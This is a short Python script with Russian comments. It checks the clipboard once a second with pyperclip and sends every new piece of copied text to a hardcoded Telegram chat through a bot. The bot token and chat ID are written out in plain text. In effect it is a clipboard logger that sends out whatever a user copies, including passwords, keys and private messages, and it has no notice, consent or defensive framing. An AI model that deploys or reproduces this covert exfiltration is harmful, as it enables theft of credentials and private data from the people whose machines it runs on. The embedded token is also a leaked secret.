import pyperclip
import time
import asyncio
from telegram import Bot

# Вставьте ваш token от бота Telegram и ID чата
TELEGRAM_TOKEN = '7939706661:AAGhEG4ow-4XNhdIhDuIGNgJ-sDovxdou3s'
CHAT_ID = '-4649696760'


# Создаем экземпляр асинхронного бота
async def send_to_telegram(text):
    bot = Bot(token=TELEGRAM_TOKEN)

    # Разбиваем текст на части, если он превышает 4096 символов
    max_message_length = 4096
    while len(text) > max_message_length:
        # Отправляем первую часть
        await bot.send_message(chat_id=CHAT_ID, text=text[:max_message_length])
        # Убираем отправленную часть из текста
        text = text[max_message_length:]

    # Отправляем оставшуюся часть текста
    if text:
        await bot.send_message(chat_id=CHAT_ID, text=text)

    print(f"Отправлено в Telegram: {text[:50]}...")  # Печатаем только первые 50 символов для краткости


# Асинхронная функция для отслеживания буфера обмена
async def track_clipboard():
    last_text = ""

    while True:
        # Получаем текущий текст из буфера обмена
        current_text = pyperclip.paste()

        # Проверяем, изменился ли текст в буфере обмена
        if current_text != last_text and current_text.strip() != "":
            last_text = current_text
            await send_to_telegram(current_text)

        # Ждем 1 секунду, чтобы не нагружать процессор
        await asyncio.sleep(1)


# Главная асинхронная функция, запускающая отслеживание буфера обмена
async def main():
    await track_clipboard()


if __name__ == "__main__":
    # Запускаем основной асинхронный цикл
    asyncio.run(main())
